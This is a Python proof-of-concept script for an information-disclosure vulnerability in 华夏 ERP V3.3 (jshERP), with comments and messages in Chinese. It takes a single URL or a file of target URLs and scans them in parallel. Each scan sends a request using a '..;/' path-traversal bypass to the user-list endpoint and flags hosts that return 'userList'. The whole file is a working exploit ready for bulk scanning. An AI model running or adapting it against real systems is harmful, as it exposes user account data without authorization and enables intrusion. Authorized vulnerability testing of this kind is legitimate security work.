import requests
import argparse
from multiprocessing import Pool
import urllib.parse
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='华夏 ERPV3.3 信息泄漏漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url!')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file!')
    args = parser.parse_args()
    pool = Pool(20)
    if args.url:
        target = format_url(args.url)
        check(target)
    elif args.file:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for line in f.readlines():
                    line = line.strip()
                    target = format_url(line)
                    targets.append(target)
            pool.map(check, targets)
            pool.close()
            pool.join()  # 添加join，确保进程池任务执行完毕并正确释放资源
        except FileNotFoundError:
            print(f"文件 {args.file} 不存在，请检查路径是否正确")
        except PermissionError:
            print(f"没有权限打开文件 {args.file}")
        except Exception as e:
            print(f"读取文件出现其他异常: {e}")



def check(target):
    target = format_url(target)
    target = target+'/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Connection': 'close',
    }
    try:
        response = requests.get(target, headers=headers, verify=False,timeout=5)
        text = response.text
        if response.status_code == 200 and "userList" in response.text:
            print(f"[+]{target} is vulnerable!")
        else:
            print(f"[-]{target} is not vulnerable!")
    except requests.exceptions.Timeout:
        print(f"[-]{target} 超时")
    except requests.exceptions.RequestException as e:
        print(f"[-]{target} 出现请求异常: {e}")



def format_url(url):
    # 去除 URL 首尾的空白字符
    url = url.strip()
    """格式化URL，补充协议头，添加路径，确保URL格式规范"""
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme:
        return 'http://'+url
    return url

if __name__ == '__main__':
    main()